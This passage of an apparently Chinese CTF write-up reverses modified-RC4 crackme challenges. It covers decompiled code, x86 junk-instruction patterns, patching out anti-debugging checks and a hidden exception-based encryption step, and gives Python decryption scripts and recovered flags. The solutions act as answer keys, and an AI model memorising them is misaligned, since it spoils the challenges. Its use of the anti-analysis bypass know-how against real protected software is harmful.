<p>所以整个验证的逻辑是：读取输入的32字节明文 → 在sub_21345生成用于KSA的新密钥<font color=red><strong>Give_it_a_try</strong></font>来替换原有的密钥kk（<font color=orange><strong>this_is_a_key</strong></font>） → 在sub_11073进行KSA → 固定随机数生成器种子0x159357 → 进行魔改的PRGA部分，并8字节进行一次随机左右移位加密 → 与密文进行比较.</p>
<p>先用C++脚本在linux端得到rand的值：<font color=lime><strong>0x77a5f458, 0x5cd55fa0, 0xaba2de1, 0x71decc39, 0x71ff587f, 0x435ba25c, 0xda0751, 0x4de87893</strong></font>，然后转换成位移：<font color=LimeGreen><strong>left 32，right 57，right 28，right 19</strong></font>，编写解密脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">0xCD8413F20B6FCE4C</span>, <span class="number">0x5C9B1B43933043CF</span>, <span class="number">0x1C6EB6E1A546128E</span>, <span class="number">0x77C6E3D7AE009A3E</span>]</span><br><span class="line">enc[<span class="number">0</span>] = enc[<span class="number">0</span>] ^ ((enc[<span class="number">0</span>] &lt;&lt; <span class="number">32</span>)&amp; <span class="number">0xFFFFFFFFFFFFFFFF</span>)</span><br><span class="line">enc[<span class="number">1</span>] = enc[<span class="number">1</span>] ^ ((enc[<span class="number">1</span>] &gt;&gt; <span class="number">57</span>)&amp; <span class="number">0xFFFFFFFFFFFFFFFF</span>)</span><br><span class="line">enc[<span class="number">2</span>] = enc[<span class="number">2</span>] ^ ((enc[<span class="number">2</span>] &gt;&gt; <span class="number">28</span>)&amp; <span class="number">0xFFFFFFFFFFFFFFFF</span>)</span><br><span class="line">enc[<span class="number">3</span>] = enc[<span class="number">3</span>] ^ ((enc[<span class="number">3</span>] &gt;&gt; <span class="number">19</span>)&amp; <span class="number">0xFFFFFFFFFFFFFFFF</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(enc[i])[<span class="number">2</span>:],end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br></pre></td></tr></table></figure>
<p>得到结果：<font color=violet><strong>c6ebddbe0b6fce4c5c9b1b43933043e11c6eb6e063ad7c9477c6ed2f727a6ffe</strong></font>，在cyberchef用RC4解密，发现解出的数据为：<code>flag&#123;This\_may\_be\_RC4\_al&#123;oriti²:É</code>，后两个qword有一定的偏差，推测发现这个加密步骤是不可逆的（会丢失信息），在一定范围内通过枚举找到原明文（这里是第三个的例子）：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="number">0x1C6EB6E1A546128E</span></span><br><span class="line"><span class="keyword">for</span> enc <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1c6eb6e063ad7c80</span>,<span class="number">0x1c6eb6e063ad7d00</span>):</span><br><span class="line">    dec = enc ^ ((enc &gt;&gt; <span class="number">28</span>)&amp; <span class="number">0xFFFFFFFFFFFFFFFF</span>)</span><br><span class="line">    <span class="comment"># print(target-dec)</span></span><br><span class="line">    <span class="comment"># print(hex(dec))</span></span><br><span class="line">    <span class="keyword">if</span>(target == dec):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(enc))</span><br></pre></td></tr></table></figure>
<p>得到第三个qword的值为：<code>0x1c6eb6e063ad7c88</code>，第四个qword的值为：<code>0x77c6ed2f73a5744a</code>，则flag为：<font color=deepskyblue><strong>flag{This_may_be_RC4_algorithm!}</strong></font>.</p>
<h2 id="base："><a href="#base：" class="headerlink" title="base："></a>base：</h2><p>查看汇编界面发现有很多花指令：</p>
<p>第一种结构：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>004139BD                 <span class="keyword">jz</span>      short <span class="built_in">near</span> <span class="built_in">ptr</span> loc_4139C1+<span class="number">1</span> <span class="comment">;不论正误全都跳转（有的跳转略有偏移）</span></span><br><span class="line"><span class="symbol">.text:</span>004139BF                 <span class="keyword">jnz</span>     short <span class="built_in">near</span> <span class="built_in">ptr</span> loc_4139C1+<span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>004139C1</span><br><span class="line"><span class="symbol">.text:</span>004139C1 loc_4139C1:                             <span class="comment">; CODE XREF: .text:004139BD↑j</span></span><br><span class="line"><span class="symbol">.text:</span>004139C1                                         <span class="comment">; .text:004139BF↑j</span></span><br><span class="line"><span class="symbol">.text:</span>004139C1                 <span class="keyword">call</span>    <span class="built_in">near</span> <span class="built_in">ptr</span> <span class="number">1AA2AEh</span> <span class="comment">;错误编译，因为其上面一条是无效机器码</span></span><br></pre></td></tr></table></figure>
<p>第二种结构：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>004139DC                 <span class="keyword">call</span>    loc_4139E2 <span class="comment">;①这里先传到E2</span></span><br><span class="line"><span class="symbol">.text:</span>004139DC <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>004139E1                 <span class="built_in">db</span> <span class="number">83h</span> <span class="comment">;无效指令</span></span><br><span class="line"><span class="symbol">.text:</span>004139E2 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>004139E2</span><br><span class="line"><span class="symbol">.text:</span>004139E2 loc_4139E2:                             <span class="comment">; CODE XREF: .text:004139DC↑j</span></span><br><span class="line"><span class="symbol">.text:</span>004139E2                 <span class="built_in">db</span>      <span class="number">36h</span></span><br><span class="line"><span class="symbol">.text:</span>004139E2                 <span class="keyword">add</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>], <span class="number">8</span> <span class="comment">;②将esp+8</span></span><br><span class="line"><span class="symbol">.text:</span>004139E7                 <span class="keyword">retn</span> <span class="comment">;③return到E1+8</span></span><br><span class="line"><span class="symbol">.text:</span>004139E7 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>004139E8                 <span class="built_in">db</span> <span class="number">0F3h</span> <span class="comment">;无效指令</span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">.text:</span>004139E9 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>004139E9                 <span class="keyword">push</span>    offset unk_41C5B8 <span class="comment">;继续后续执行</span></span><br></pre></td></tr></table></figure>
<p>全部抹掉，并且发现还有一个反调试，检测到调试器直接退出，也改为强制跳转，得到正确的main：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+D4h] [ebp-BCh]</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">5</span>]; <span class="comment">// [esp+11Ch] [ebp-74h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">20</span>]; <span class="comment">// [esp+160h] [ebp-30h] BYREF</span></span><br><span class="line">  CPPEH_RECORD ms_exc; <span class="comment">// [esp+178h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(Str, <span class="string">&quot;f75bf3e3f919&quot;</span>);						<span class="comment">//密钥1</span></span><br><span class="line">  j_Is_Debugger_Present_();						<span class="comment">//这里本来有一个检测到调试器就退出</span></span><br><span class="line">  v3 = j_strlen(Str);</span><br><span class="line">  j_KSA((<span class="type">int</span>)Str, v3, (<span class="type">int</span>)&amp;sbox1);						<span class="comment">//用密钥1生成sbox1</span></span><br><span class="line">  j_PRGA_4((<span class="type">int</span>)&amp;sbox1, (<span class="type">int</span>)sbox2, <span class="number">256</span>);					<span class="comment">//用sbox1的值修改sbox2</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;plz input your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%42s&quot;</span>, (<span class="type">char</span>)v6);</span><br><span class="line">  RC4_PRGA_ALL((<span class="type">int</span>)v6, <span class="number">42</span>);						<span class="comment">//加密</span></span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">-2</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">42</span>; ++i )							<span class="comment">//flag长度为42</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6[i] != encflag [i] )						<span class="comment">//密文</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;wrong!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;right!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现程序内一共有4个版本的RC4的PRGA部分，推测加密逻辑：<br><br>首先用第一个密钥<font color=red><strong>f75bf3e3f919</strong></font>通过正常的KSA生成了sbox1，然后用PRGA4生成了sbox2，其中PRGA4比正常的PRGA多异或了一个0x47，接着看下面的主要加密过程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">ALL_PRGA</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-24h]</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">20</span>]; <span class="comment">// [esp+DCh] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(Str, <span class="string">&quot;363296f1-9353&quot;</span>); <span class="comment">//第二个密钥</span></span><br><span class="line">  v2 = j_strlen(Str);</span><br><span class="line">  j_KSA((<span class="type">int</span>)Str, v2, (<span class="type">int</span>)&amp;sbox3); <span class="comment">//生成第三个s盒</span></span><br><span class="line">  sbox_transform(a1, a2); <span class="comment">//带入了明文和明文的长度42</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !(i % <span class="number">3</span>) )</span><br><span class="line">      j_PRGA_1((<span class="type">int</span>)&amp; sbox3, i + a1, <span class="number">1</span>); <span class="comment">//明文按除以三的余数选择PRGA</span></span><br><span class="line">    <span class="keyword">if</span> ( i % <span class="number">3</span> == <span class="number">1</span> )</span><br><span class="line">      j_PRGA_2((<span class="type">int</span>)&amp;sbox3, i + a1, <span class="number">1</span>); <span class="comment">//一次只带入一个字节，并且改变了原来的</span></span><br><span class="line">    <span class="keyword">if</span> ( i % <span class="number">3</span> == <span class="number">2</span> )</span><br><span class="line">      j_PRGA_3((<span class="type">int</span>)&amp; sbox3, i + a1, <span class="number">1</span>); <span class="comment">//sbox3的值</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现这三个PRGA分别在最后异或了不同数组的值，查看sbox_transform：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">gen_sbox</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + a1) = sbox2[*(<span class="type">unsigned</span> __int8 *)(i + a1)];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现是用明文和sbox2的对应索引发生了置换，此外，还有一个函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__thiscall <span class="title function_">sub_412AA0</span><span class="params">(<span class="type">void</span> *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE CurrentThread; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [esp+D0h] [ebp-68h]</span></span><br><span class="line">  FARPROC ProcAddress; <span class="comment">// [esp+10Ch] [ebp-2Ch]</span></span><br><span class="line">  HMODULE hModule; <span class="comment">// [esp+118h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+124h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+124h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i )</span><br><span class="line">    ModuleName[i] ^= <span class="number">0x72u</span>;						<span class="comment">//Ntdll</span></span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">22</span>; ++j )</span><br><span class="line">    asc_41C0C8[j] ^= <span class="number">0x72u</span>;						<span class="comment">//thread…</span></span><br><span class="line">  hModule = GetModuleHandleA(ModuleName);</span><br><span class="line">  ProcAddress = GetProcAddress(hModule, asc_41C0C8);</span><br><span class="line">  CurrentThread = GetCurrentThread();</span><br><span class="line">  ((<span class="type">void</span> (__stdcall *)(HANDLE, <span class="type">int</span>, _DWORD, _DWORD))ProcAddress)(CurrentThread, <span class="number">17</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">3</span>; ++k )</span><br><span class="line">    *(_BYTE *)(k + <span class="number">0x41C03C</span>) ^= <span class="number">0x34u</span>;					<span class="comment">//在这里修改了key的值</span></span><br><span class="line">  <span class="keyword">return</span> this;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>据此总结出完整的加密流程：</p>
<p>①	用第一个密钥f75bf3e3f919通过正常的KSA生成了sbox1<br><br>②	用sbox1进行PRGA4（额外异或0x47）加密原有的sbox2<br><br>③	用第二个密钥363296f1-9353通过正常的KSA生成了sbox3<br><br>④	用sbox2对应索引的值替换输入的明文<br><br>⑤	用sbox3根据不同的索引选择不同的PRGA额外异或对象进行加密（分别额外异或key的第0、1、2个索引）</p>
<p>编写同构加密脚本，发现结果并不正确，回到原点，思考：程序为什么不能调试？经过尝试发现原来在初始化的一些函数会触发异常，nop掉之后正常进入调试，发现前面的逻辑都正确，调试发现，在ALL_PRGA加密完成后，main函数中实际上进行了一次除以零的异常处理，并用异常处理再次加密了数据，加密方式为把明文视作7*6的二维数组并进行了循环异或，加入该逻辑后，编写同构和解密脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">KSA</span>(<span class="params">key, sbox</span>):</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + sbox[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">        sbox[i], sbox[j] = sbox[j], sbox[i]</span><br><span class="line">    <span class="keyword">return</span> sbox</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PRGA</span>(<span class="params">sbox, plaintext</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    encrypted_data = [<span class="literal">None</span>] * <span class="built_in">len</span>(plaintext)</span><br><span class="line">    <span class="keyword">for</span> idx, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(plaintext):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + sbox[i]) % <span class="number">256</span></span><br><span class="line">        sbox[i], sbox[j] = sbox[j], sbox[i]</span><br><span class="line">        k = sbox[(sbox[i] + sbox[j]) % <span class="number">256</span>]</span><br><span class="line">        encrypted_data[idx] = (byte ^ k) ^ <span class="number">0x47</span></span><br><span class="line">    <span class="keyword">return</span> encrypted_data</span><br><span class="line"></span><br><span class="line"><span class="comment">#一次性加密一个字节的PRGA</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">OneTextPRGA</span>(<span class="params">sbox, info, key_b</span>):</span><br><span class="line">    enc = <span class="number">0</span></span><br><span class="line">    index = sbox[<span class="number">1</span>]</span><br><span class="line">    sbox[<span class="number">1</span>], sbox[index] = sbox[index], sbox[<span class="number">1</span>]</span><br><span class="line">    k = sbox[(sbox[<span class="number">1</span>] + sbox[index]) % <span class="number">256</span>]</span><br><span class="line">    info ^= k</span><br><span class="line">    info ^= key_b</span><br><span class="line">    <span class="keyword">return</span> sbox, info</span><br><span class="line"></span><br><span class="line"><span class="comment">#异常处理中隐藏的加密和对应解密过程</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_transform</span>(<span class="params">data</span>):</span><br><span class="line">    data = <span class="built_in">bytearray</span>(data)</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">            data[row*<span class="number">6</span> + col] ^= data[row*<span class="number">6</span> + col - <span class="number">1</span>]</span><br><span class="line">        data[row*<span class="number">6</span>] ^= data[row*<span class="number">6</span> + <span class="number">5</span>]</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_transform</span>(<span class="params">data</span>):</span><br><span class="line">    data = <span class="built_in">bytearray</span>(data)</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        data[row*<span class="number">6</span>] ^= data[row*<span class="number">6</span> + <span class="number">5</span>]</span><br><span class="line">        <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            data[row*<span class="number">6</span> + col] ^= data[row*<span class="number">6</span> + col - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment">#初始化sbox1</span></span><br><span class="line">sbox1 = [<span class="literal">None</span>]*<span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    sbox1[i] = i</span><br><span class="line"><span class="comment">#用第一个密钥生成sbox1</span></span><br><span class="line">sbox1 = KSA(<span class="string">b&quot;f75bf3e3f919&quot;</span>, sbox1)</span><br><span class="line"><span class="comment">#sbox2原本的值</span></span><br><span class="line">sbox2 = [<span class="number">0x09</span>, <span class="number">0x76</span>, <span class="number">0x6A</span>, <span class="number">0xF8</span>, <span class="number">0x12</span>, <span class="number">0x4A</span>, <span class="number">0x8B</span>, <span class="number">0xF6</span>, <span class="number">0x6F</span>, <span class="number">0xC0</span>, <span class="number">0x5F</span>, <span class="number">0x3C</span>, <span class="number">0xB4</span>, <span class="number">0x7F</span>, <span class="number">0x3B</span>, <span class="number">0xA5</span>, </span><br><span class="line">         <span class="number">0x80</span>, <span class="number">0x1D</span>, <span class="number">0x62</span>, <span class="number">0xA1</span>, <span class="number">0x47</span>, <span class="number">0x3B</span>, <span class="number">0xE9</span>, <span class="number">0x58</span>, <span class="number">0xB3</span>, <span class="number">0x17</span>, <span class="number">0x10</span>, <span class="number">0xE6</span>, <span class="number">0xBA</span>, <span class="number">0x39</span>, <span class="number">0x97</span>, <span class="number">0xDB</span>, </span><br><span class="line">         <span class="number">0x75</span>, <span class="number">0x2F</span>, <span class="number">0x6B</span>, <span class="number">0x20</span>, <span class="number">0xD1</span>, <span class="number">0x7A</span>, <span class="number">0xD2</span>, <span class="number">0xF6</span>, <span class="number">0x4F</span>, <span class="number">0xBF</span>, <span class="number">0x9D</span>, <span class="number">0x93</span>, <span class="number">0x79</span>, <span class="number">0x6B</span>, <span class="number">0x1D</span>, <span class="number">0x34</span>, </span><br><span class="line">         <span class="number">0xE0</span>, <span class="number">0x33</span>, <span class="number">0xF2</span>, <span class="number">0x45</span>, <span class="number">0xBB</span>, <span class="number">0x40</span>, <span class="number">0x31</span>, <span class="number">0x1A</span>, <span class="number">0x78</span>, <span class="number">0xDA</span>, <span class="number">0x24</span>, <span class="number">0xBD</span>, <span class="number">0xEE</span>, <span class="number">0x03</span>, <span class="number">0x8D</span>, <span class="number">0x3B</span>, </span><br><span class="line">         <span class="number">0x1F</span>, <span class="number">0xD9</span>, <span class="number">0xE8</span>, <span class="number">0xEB</span>, <span class="number">0xDC</span>, <span class="number">0xE6</span>, <span class="number">0x8C</span>, <span class="number">0x1E</span>, <span class="number">0x4B</span>, <span class="number">0x86</span>, <span class="number">0xEF</span>, <span class="number">0x14</span>, <span class="number">0x11</span>, <span class="number">0x2D</span>, <span class="number">0x64</span>, <span class="number">0x67</span>, </span><br><span class="line">         <span class="number">0x36</span>, <span class="number">0x91</span>, <span class="number">0x26</span>, <span class="number">0x09</span>, <span class="number">0x59</span>, <span class="number">0x59</span>, <span class="number">0x86</span>, <span class="number">0x8E</span>, <span class="number">0x9E</span>, <span class="number">0x48</span>, <span class="number">0x42</span>, <span class="number">0x89</span>, <span class="number">0xB7</span>, <span class="number">0x41</span>, <span class="number">0x52</span>, <span class="number">0x1A</span>, </span><br><span class="line">         <span class="number">0x1A</span>, <span class="number">0x63</span>, <span class="number">0xFE</span>, <span class="number">0x2A</span>, <span class="number">0xEF</span>, <span class="number">0x0E</span>, <span class="number">0xA1</span>, <span class="number">0x9F</span>, <span class="number">0x85</span>, <span class="number">0xD6</span>, <span class="number">0xA7</span>, <span class="number">0x28</span>, <span class="number">0x19</span>, <span class="number">0xB8</span>, <span class="number">0x6E</span>, <span class="number">0x66</span>, </span><br><span class="line">         <span class="number">0x06</span>, <span class="number">0xD4</span>, <span class="number">0xFE</span>, <span class="number">0xAF</span>, <span class="number">0xD2</span>, <span class="number">0x20</span>, <span class="number">0x11</span>, <span class="number">0x0F</span>, <span class="number">0xDD</span>, <span class="number">0x4A</span>, <span class="number">0xA6</span>, <span class="number">0x3D</span>, <span class="number">0xAE</span>, <span class="number">0x9A</span>, <span class="number">0x01</span>, <span class="number">0x09</span>, </span><br><span class="line">         <span class="number">0xE6</span>, <span class="number">0x85</span>, <span class="number">0x68</span>, <span class="number">0xB8</span>, <span class="number">0xE0</span>, <span class="number">0xA4</span>, <span class="number">0x8D</span>, <span class="number">0xBE</span>, <span class="number">0x00</span>, <span class="number">0xC4</span>, <span class="number">0x7D</span>, <span class="number">0x16</span>, <span class="number">0x92</span>, <span class="number">0x8E</span>, <span class="number">0x87</span>, <span class="number">0xE5</span>, </span><br><span class="line">         <span class="number">0xB1</span>, <span class="number">0xA5</span>, <span class="number">0x5D</span>, <span class="number">0xB3</span>, <span class="number">0x75</span>, <span class="number">0x88</span>, <span class="number">0x0F</span>, <span class="number">0xA7</span>, <span class="number">0x2C</span>, <span class="number">0x21</span>, <span class="number">0xAD</span>, <span class="number">0x2E</span>, <span class="number">0xA8</span>, <span class="number">0x36</span>, <span class="number">0xCC</span>, <span class="number">0xCB</span>, </span><br><span class="line">         <span class="number">0x06</span>, <span class="number">0xEB</span>, <span class="number">0xB9</span>, <span class="number">0x73</span>, <span class="number">0x29</span>, 